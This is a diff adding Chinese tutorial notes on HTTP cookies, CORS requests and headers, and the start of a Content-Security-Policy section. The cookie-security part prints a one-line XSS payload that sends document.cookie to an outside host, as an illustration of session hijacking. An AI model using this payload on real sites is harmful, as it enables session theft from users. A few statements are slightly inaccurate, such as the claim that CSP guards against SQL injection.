@@ -251,8 +251,367 @@ Vary: User-Agent
 
 ## 三、HTTP Cookie
 
-## 四、HTTP跨域
+HTTP Cookie是服务器发送到用户浏览器并保存在本地的一小块数据。它会在下一次向同一台服务器再发起请求时被携带并发送到服务器上，用来告知服务器两次请求是否来自同一浏览器，经常被用来保持用户登录状态。**Cookie实现了HTTP 有状态**。在Chrome的开发者工具可以看到Cookie详情：
+![Cookie](./pic/8.png)
+
+### 3.1 创建Cookie
+
+当服务器收到HTTP请求时，在相应头中设置Cookie（**Set-Cookie**），浏览器接收到响应后会保存Cookie，之后对服务器每次请求都会在头部带上**Cookie**，一个Cookie在创建后会有很多参数，正如下图所示，包括：
+**[Name、Value、Domain、Path、Expires、Size、HttpOnly、Secure、SameSite]**。
+![Cookie](./pic/9.png)
+
+1、Set-Cookie响应 & Cookie请求
+
+Set-Cookie:
+
+```js
+HTTP/1.0 200 OK
+Content-type: text/html
+...
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+```
+
+Cookie:
+
+```js
+GET /sample_page.html HTTP/1.1
+Host: www.example.org
+...
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+```
+
+2、会话Cookie和持久Cookie
+
+会话Cookie是最简单的Cookie，它只在浏览器会话阶段有效。当浏览器关闭时，Cookie被自动删除；另一种Cookie是持久Cookie，持久Cookie会指定一个失效日期（**Expire**）或有效期（**Max-Age**）。
+
+```js
+Set-Cookie: id=36fa; Expire=Wed, 21 Oct 2020 07:22:00 GMT;
+```
+
+注意：<font color='red'>Cookie被设定并保存到客户端浏览器中，它的失效日期和有效期是和客户端相关的，和服务端无关。</font>
+
+3、Cookie的Secure和HttpOnly标记
+
+- 标记为Secure的Cookie只能通过HTTPS协议加密后的请求进行传输。
+- 为避免跨域攻击（XSS），js脚本的API无法访问带有HttpOnly标记的Cookie
+
+```js
+// 该Cookie只能通过Https传输，并且无法被js的API访问
+Set-Cookie: id=a3fWa; Expire=...; Secure; HttpOnly
+```
+
+4、Cookie作用域
+
+Domain和Path标识了Cookie的作用域：即Cookie应该发送给哪些URL
+
+- Domain：哪些主机可以接受Cookie
+- Path：主机下哪些路径可以接受Cookie
+
+```js
+// .baidu.com下的所有路径都可接受该Cookie
+Set-Cookie: H_PS_PSSID=1437_31169; path=/; domain=.baidu.com
+```
+
+5、SameSite Cookie
+
+SameSite控制Cookie在跨站请求时的发送与否，其取值如下：
+
+- None：服务器允许同站请求和跨站请求下发送Cookie
+- Strict：服务器只允许同站请求下发送Cookie
+- Lax：在新版浏览器中，为**SameSite的默认值**。老的浏览器中默认值为Nonde。它介于None和Strict之间
+
+下面一个图了解三者区别（其中Strict不会对任何一个跨域请求发送Cookie）：
+
+![SameSite](./pic/10.png)
+
+其中前三者都是导航到目标网址的GET请求。
+
+6、通过JS的API访问Cookie
+
+通过Document.cookie可以创建新的Cookie，也可通过该属性访问非HttpOnly的Cookie。
+
+通过API创建Cookie
+![js操作Cookie 1](./pic/11.png)
+查看当前会话中Cookie的情况
+![js操作Cookie 2](./pic/12.png)
+
+### 3.2 安全
+
+1、会话劫持和XSS
+在Web应用中，Cookie被标记为用户或授权会话。如果Cookie被窃听，可能导致用户被攻击。常见的会话劫持使用XSS（跨域脚本攻击）实现：
+
+```js
+(new Image()).src="http://www..." + document.cookie
+```
+
+将服务器返回的Cookie加上HttpOnly后能一定程度上的缓解此类攻击。
+
+2、跨站请求伪造（CSRF）
+
+一个例子：
+制造一个假冒链接（文字或图片等），受害者点击之后，点击到了一个银行卡体现的请求，如果在这之前银行网站账号和Cookie等都还有效并且没有其他验证步骤（这在现在是不可能的），那么你的钱就会被自动转走。
+
+解决方法：
+
+- 任何敏感操作需要加验证（比如手机验证码等）
+- 敏感的Cookie设置较短的生命周期
+
+3、追踪和隐私
+
+每个Cookie都有自己的域，如果Cookie与当前页面的域相同，那么这个Cookie相对于当前页面为第一方Cookie，如果不同，称为第三方Cookie。第三方Cookie（通过第三方组件）通常用来收集用户相关信息以用于实现广告投放和网络追踪等。
+
+想要禁止个人信息的追踪，可以在浏览器设置DNT，或者在发送请求头的时候设置DNT。查看当前网站DNT设置的方法：
+
+```js
+navigator.doNotTrack    // 0（默认）愿意被追踪，1表示不愿意
+```
+
+## 四、HTTP跨域（重要）
+
+跨域的产生：[浏览器的同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)，简单来说，就是为保护浏览器安全，限制了来自不同源的document（限制跨域属性）、Cookie（跨域不可读写）、XMLHttpRequest（不能跨域访问）中的部分功能。像浏览器中的像\<link>，\<script>，\<img>等一些标签都可以跨域加载资源，只不过浏览器对应限制了js的权限（不同源的css、img等不可读写，只能应用）。
+
+跨域资源共享（CORS）是一种机制，它使用额外的HTTP头来告诉浏览器，让运行在A源的网页允许访问其他来自不同源服务器的指定资源。**当一个资源从该资源本身外的服务器请求另一个资源时，资源就会发起一个跨域请求**（比如一个通向其他服务器的超链接）。
+出于安全考虑，浏览器限制从脚本内发起跨域HTTP请求，比如XMLHttPRequest和Fetch遵循同源策略。意味着使用这样API发起HTTP只能加载同一个服务器的资源。除非相应报文中包含正确的CORS响应头。
+
+**下面的图表示了一个跨域请求。** 整个主页面在a服务器，对于上面二个资源请求，请求的服务器是a，属于同源请求；对于主页面中下面的资源，发起请求的服务器时b，属于跨域请求。
+![跨域1](./pic/13.png)
+
+**根据访问控制场景展开说明**：
+包括简单请求、预检请求、附带身份凭证的请求，都是基于XMLHttpRequest。
+
+### 4.1 简单请求
+
+不会触发预检请求，称为简单请求。需要满足下述**所有**条件：
+
+- 请求方法使用GET、HEAD、POST方法中的一个
+- 请求字段中不得设置<font color='blue'>CORS 安全的首部字段集合</font>[Accept、Accept-Language、Content-Language、Content-Type（需要额外限制）、DPR、Downlink、Save-Data、Viewport-Width、Width]外的字段
+- Content-Type的值使用text/plain、multipart/form-data、application/x-www-form-urlencoded中的一个。
+- 请求中的任意XMLHttpRequestUpload对象均没有注册任何事件监听器
+- 请求中没有使用ReadableStream对象
+
+简单请求的过程如下：
+
+站点 <http://foo.example> 的网页应用想要访问 <http://bar.other> 的资源。<http://foo.example> 的网页中可能包含类似于下面的 JavaScript 代码：
+
+```js
+var invocation = new XMLHttpRequest();
+var url = 'http://bar.other/resources/public-data/';
+
+function callOtherDomain() {
+  if(invocation) {
+    invocation.open('GET', url, true);
+    invocation.onreadystatechange = handler;
+    invocation.send();
+  }
+}
+```
+
+![简单请求](./pic/14.png)
+
+```js
+// 请求报文---在主资源页面上发送请求到外域资源所在服务器
+GET /resources/public-data/ HTTP/1.1
+Host: bar.other
+...
+Origin: http://foo.example
+
+// 响应报文
+HTTP/1.1 200 OK
+Content-Type: application/xml
+...
+Access-Control-Allow-Origin: *
+```
+
+请求首部字段Origin表明该跨域请求来源于<http://foo.example>。响应中返回Access-Control-Allow-Origin：*代表该资源可以被任意外域访问，如果服务端仅允许来自<http://foo.example>的访问，那么设置为：
+
+```js
+// 设置为特定url，表示除了该url，其他外域均不能访问该资源
+Access-Control-Allow-Origin: http://foo.example
+```
+
+### 4.2 预检请求
+
+与简单请求不同，预检请求要求必须首先发送一个OPTIONS方法到服务器，以获取服务器同意。
+
+满足下述**任一**条件时，即发送预检请求：
+
+- 使用了PUT、DELETE、CONNECT、OPTIONS、TRACE、PATCH中的方法
+- 使用了<font color='blue'>CORS 安全的首部字段集合</font>之外的字段
+- Content-Type不是简单请求的类型
+- 请求中的XMLHttpRequestUpload对象注册了事件监听器
+- 请求中使用了ReadableStream对象
+
+预检请求的过程如下：
+
+下面的代码使用 POST 请求发送一个 XML 文档，该请求包含了一个自定义的请求首部字段（X-PINGOTHER: pingpong）。另外，该请求的 Content-Type 为 application/xml。因此，该请求需要首先发起“预检请求”。
+
+```js
+var invocation = new XMLHttpRequest();
+var url = 'http://bar.other/resources/post-here/';
+var body = '<?xml version="1.0"?><person><name>Arun</name></person>';
+
+function callOtherDomain(){
+  if(invocation)
+    {
+      invocation.open('POST', url, true);
+      invocation.setRequestHeader('X-PINGOTHER', 'pingpong');
+      invocation.setRequestHeader('Content-Type', 'application/xml');
+      invocation.onreadystatechange = handler;
+      invocation.send(body);
+    }
+}
+```
+
+![预检请求](./pic/15.png)
+
+```js
+// 预检请求报文
+OPTIONS /resources/post-here/ HTTP/1.1
+Host: bar.other
+...
+Origin: http://foo.example
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: X-PINGOTHER, Content-Type
+
+// 预检响应报文
+HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: http://foo.example
+Access-Control-Allow-Methods: POST, GET, OPTIONS
+Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
+Access-Control-Max-Age: 86400
+```
+
+发送完预检请求后发送正式资源请求：
+
+```js
+// 资源请求报文
+POST /resources/post-here/ HTTP/1.1
+...
+X-PINGOTHER: pingpong
+Origin: http://foo.example
+
+<?xml version="1.0"?><person><name>Arun</name></person>
+
+// 资源响应报文
+HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: http://foo.example
+
+[Some GZIP'd payload]
+```
+
+<font color='red'>分析：</font>
+1、浏览器根据规则检测到最开始的报文是一个预检请求。其中预检请求的OPTIONS方法是HTTP1.1定义的。其中还包含:
+
+```js
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: X-PINGOTHER, Content-Type
+```
+
+前者告知服务器，实际的请求时用POST方法，而后者告知服务器实际请求携带两个自定义请求字段：X-PINGOTHER, Content-Type。
+2、预检请求响应表明接受跨域资源请求，其中：
+
+```js
+Access-Control-Allow-Origin: http://foo.example
+Access-Control-Allow-Methods: POST, GET, OPTIONS
+Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
+Access-Control-Max-Age: 86400
+```
+
+Access-Control-Allow-Origin与直接请求的意思相同，指示什么样的源可以访问该资源。Access-Control-Allow-Methods表明服务器允许客户端以POST、GET、OPTIONS发起资源请求。Access-Control-Allow-Headers表明允许请求中携带X-PINGOTHER, Content-Type头字段。Access-Control-Max-Age规定了该预检响应有效期为86400秒（24小时）
+
+### 4.3 附带身份凭证的请求
+
+一般来说，对于跨域XMLHttpRequest和Fetch请求，浏览器不会发送身份凭证信息，如果需要发送类似Cookie以确认身份，需要设置XMLHttpRequest相关的字段：
+
+本例中，<http://foo.example> 的某脚本向 <http://bar.other> 发起一个GET 请求，并设置 Cookies：
+
+```js
+var invocation = new XMLHttpRequest();
+var url = 'http://bar.other/resources/credentialed-content/';
+
+function callOtherDomain(){
+    if(invocation){
+        invocation.open('GET', url, true);
+        // 设置withCredentials属性，向服务器发送Cookies
+        invocation.withCredentials = true;
+        invocation.onreadystatechange = handler;
+        invocation.send();
+    }
+}
+```
+
+由于是一个简单GET请求，所以浏览器不会对其发起“预检请求”。但是，如果响应报文中未携带Access-Control-Allow-Credentials: true，浏览器就不会把响应内容返回给请求的发送者（浏览器这一层进行拦截）。
+
+![附带身份凭证的请求](./pic/16.png)
+
+```js
+// 带有身份凭证的请求报文
+GET /resources/access-control-with-credentials/ HTTP/1.1
+Host: bar.other
+...
+Origin: http://foo.example
+Cookie: pageAccess=2
+
+// 身份凭证的响应报文
+HTTP/1.1 200 OK
+...
+Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
+Access-Control-Allow-Origin: http://foo.example
+Access-Control-Allow-Credentials: true
+
+[text/plain payload
+```
+
+在段报文中，即使请求报文中携带Cookie，但是如果响应报文中没有相应的Access-Control-Allow-Credentials: true信息确认，那么响应的内容也不会返回给请求者。
+
+<font color='red'>对于附带身份凭证的请求，响应报文中的Access-Control-Allow-Origin不能设置为*（任意）。因为请求的首部设置了Cookie信息，如果设置为请求源随意，则会相互矛盾，导致请求失败，如果设置为<http://foo.example>，请求将会成功</font>
+
+### 4.4 HTTP跨域字段总结
+
+#### 4.4.1 HTTP跨域请求字段
+
+下面给的跨域字段在实际应用中无需自己设置，它们在XMLHttpRequest对象发起跨域请求时已经被设置好了。
+
+1. Origin
+预检请求或实际请求的源服务器。在所有跨域请求时，它总被发送。
+2. Access-Control-Request-Method
+用于预检请求，将实际请求所使用的HTTP方法告知服务器
+3. Access-Control-Request-Headers
+用于预检请求，将实际请求所携带的首部字段告诉服务器
+
+#### 4.4.2 HTTP跨域响应字段
+
+1. Access-Control-Allow-Origin
+指定了允许访问该资源的外源URL，对于不需要携带身份凭证的请求，服务器可以指定*来表示允许来自所有域的请求。
+<font color='red'>如果服务器指定了具体域名，那么响应首部的Vary也必须包含Origin，这会告诉客户端：服务器对不同的源返回不同的内容</font>
+2. Access-Control-Allow-Methods
+用于预检响应，指明实际请求所被允许的方法
+3. Access-Control-Allow-Headers
+用于预检响应，指明实际请求索贝允许的首部字段
+4. Access-Control-Max-Age
+设置预检响应有效时间
+5. Access-Control-Allow-Credentials
+用于附带身份凭证的请求。当设置为true的时候，允许浏览器读取response内容。**当用在预检响应时，它表示实际请求是否可以使用Cookie等身份验证**。
 
 ## 五、HTTP安全
 
 ### 5.1 内容安全策略（CSP）
+
+CSP是用来防止XSS和SQL注入等攻击而提出的。
+
+通过设置Content-Security-Policy来实现CSP管理
+
+例子1：一个网站管理员希望所有资源均来自同一个源（不包括其子域名）
+
+```js
+Content-Security-Policy: default-src 'self'
+```
+
+例子2：网站管理员允许内容来自信任的域名及其子域名
+
+```js
+Content-Security-Policy: default-src 'self' *.trusted.com
+```
